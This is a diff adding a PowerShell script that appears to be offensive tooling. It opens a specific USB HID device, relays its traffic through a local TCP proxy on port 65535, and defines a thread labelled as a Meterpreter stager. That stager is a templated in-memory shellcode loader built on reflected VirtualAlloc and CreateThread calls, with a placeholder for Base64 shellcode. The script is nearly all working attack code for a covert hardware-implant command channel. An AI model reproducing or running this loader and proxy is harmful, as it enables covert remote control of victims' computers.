@@ -1,0 +1,181 @@
+if ($M -eq $null) {
+	$M = 64
+	$cs = '
+	using System;
+	using System.IO;
+	using Microsoft.Win32.SafeHandles;
+	using System.Runtime.InteropServices;
+	namespace n {
+		public class w {
+			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
+			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
+			public static FileStream o(string fn) {
+				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
+			}
+		}
+	}
+	'.Replace('%',[char]34)
+	Add-Type -TypeDefinition $cs
+	$devs = gwmi Win32_USBControllerDevice
+	foreach ($dev in $devs) {
+		$wmidev = [wmi]$dev.Dependent
+		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
+			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+		}
+	}
+	$f = [n.w]::o($fn)
+	$device = $f
+}
+
+#================== Thread 1 code: the local proxy ==================
+$Proxy = {
+	Param($M, $device)
+	try {
+		[System.Console]::WriteLine("Entering proxy thread")
+		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
+		$TcpListener.Start()
+		$tt = $TcpListener.BeginAcceptTcpClient($null, $null)
+
+		$sb = New-Object Byte[] ($M+1)
+		$db = New-Object Byte[] ($M+1)
+		$nb = New-Object Byte[] ($M+1)
+
+		$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
+
+		$stotal = 0
+		$dtotal = 0
+		$device_can_write = $false
+
+		[System.Console]::WriteLine("Entering proxy loop")
+		[System.Console]::WriteLine([String]::Format("M is {0}", $M))
+		$device.Write($nb, 0, $M+1)
+		while ($tt -ne $null -or $st -ne $null -or $dt -ne $null) {
+			if ($tt -ne $null -and $tt.IsCompleted) {
+				$TcpClient = $TcpListener.EndAcceptTcpClient($tt)
+				$TcpListener.Stop()
+				[System.Console]::WriteLine("Connection received")
+				$tt = $null
+				$socket = $TcpClient.GetStream()
+				$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
+			} elseif ($st -ne $null -and $st.IsCompleted -and $device_can_write) {
+				$sbr = $socket.EndRead($st)
+				if ($sbr -gt 0) {
+					$stotal += $sbr
+					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
+					$sb[1] = $sbr
+					$device.Write($sb, 0, $M+1)
+					$device_can_write = $false
+					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
+				} else {
+					$st = $null
+				}
+			} elseif ($dt.IsCompleted) {
+				$dbr = $device.EndRead($dt)
+				if ($dbr -gt 0) {
+					$device_can_write = (($db[1] -band 128) -eq 0)
+					if (!$device_can_write) {
+						Write-Host "Paused!"
+					}
+					$write_overflow = (($db[1] -band 64) -ne 0)
+					if ($write_overflow) {
+						Write-Host "Overflow!"
+						exit
+					}
+					$db[1] = ($db[1] -band 63)
+					if ($db[1] -gt 0) {
+						$dtotal += $db[1]
+						[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
+						$swo = $socket.Write($db, 2, $db[1])
+						$socket.Flush()
+					}
+					$null = $device.Write($nb, 0, $M+1)
+					$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
+				} else {
+					$dt = $null
+				}
+			} else {
+				Start-Sleep -m 1
+			}
+		}
+
+	} catch {
+		echo $_.Exception|format-list -force
+		$ErrorMessage = $_.Exception.Message
+		$FailedItem = $_.Exception.ItemName
+		[System.Console]::WriteLine("Exception caught, terminating main loop")
+		[System.Console]::WriteLine($ErrorMessage)
+		[System.Console]::WriteLine($FailedItem)
+	}
+
+	[System.Console]::Write("Proxy thread completed")
+
+	$device.Close()
+	$socket.Close()
+}
+
+#================== Thread 2 code: the meterpreter stager ==================
+$MeterpreterStager = {
+	[System.Console]::WriteLine("Meterpreter thread started")
+	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+	function %{func_get_proc_address} {
+		Param ($%{var_module}, $%{var_procedure})
+		$%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+		return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($%{var_module})))), $%{var_procedure}))
+	}
+
+	function %{func_get_delegate_type} {
+		Param (
+			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $%{var_parameters},
+			[Parameter(Position = 1)] [Type] $%{var_return_type} = [Void]
+		)
+
+		$%{var_type_builder} = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+		$%{var_type_builder}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%{var_parameters}).SetImplementationFlags('Runtime, Managed')
+		$%{var_type_builder}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%{var_return_type}, $%{var_parameters}).SetImplementationFlags('Runtime, Managed')
+
+		return $%{var_type_builder}.CreateType()
+	}
+
+	[Byte[]]$%{var_code} = [System.Convert]::FromBase64String("%{b64shellcode}")
+
+	$%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAlloc), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $%{var_code}.Length,0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($%{var_code}, 0, $%{var_buffer}, $%{var_code}.length)
+
+	$%{var_hthread} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero)
+	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll WaitForSingleObject), (%{func_get_delegate_type} @([IntPtr], [Int32]))).Invoke($%{var_hthread},0xffffffff) | Out-Null
+}
+
+#================= Launch both threads =================
+$proxyThread = [PowerShell]::Create()
+[void] $proxyThread.AddScript($Proxy)
+[void] $proxyThread.AddParameter("M", $M)
+[void] $proxyThread.AddParameter("device", $f)
+
+$meterpreterThread = [PowerShell]::Create()
+[void] $meterpreterThread.AddScript($MeterpreterStager)
+[System.IAsyncResult]$AsyncProxyJobResult = $null
+[System.IAsyncResult]$AsyncMeterpreterJobResult = $null
+
+try {
+	Write-Host "About to start proxy thread"
+	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
+
+	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
+#	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
+}
+catch {
+	$ErrorMessage = $_.Exception.Message
+	Write-Host $ErrorMessage
+}
+finally {
+	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
+		$proxyThread.EndInvoke($AsyncProxyJobResult)
+		$proxyThread.Dispose()
+	}
+
+	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
+		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
+		$meterpreterThread.Dispose()
+	}
+}
